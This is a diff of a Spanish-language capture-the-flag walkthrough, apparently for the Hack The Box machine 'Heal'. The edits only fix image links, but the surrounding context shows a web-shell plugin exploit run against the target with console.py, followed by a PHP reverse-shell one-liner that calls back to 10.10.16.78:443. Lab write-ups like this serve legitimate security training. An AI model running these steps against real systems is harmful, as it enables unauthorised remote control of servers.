@@ -226,7 +226,7 @@ Si todo salió bien te saldrá lo siguiente `The plugin was succesfully installe
 
 Ahora bien para usar el exploit, lo buscaremos en el menú, aparece con el nombre de `WebShell` y daremos clic en el.
 
-![Pasted image](./)
+![Pasted image](./Pasted%20image%2020250120232331.jpeg)
 
 Y ahora dentro del repositorio tenemos el script de `console.py` le daremos permisos de ejecución y lo ejecutaremos de la siguiente manera:
 
@@ -235,7 +235,7 @@ $ ./console -t http://take-survey.heal.htb
 ```
 
 Este script nos proporciona una `web shell` la cual usaremos para entablar una reverse Shell 
-![Pasted image](./Pasted%20image%2020250120232247.jpeg)
+
 
 ```php
 php -r '$sock=fsockopen("10.10.16.78",443);shell_exec("sh <&3 >&3 2>&3");'
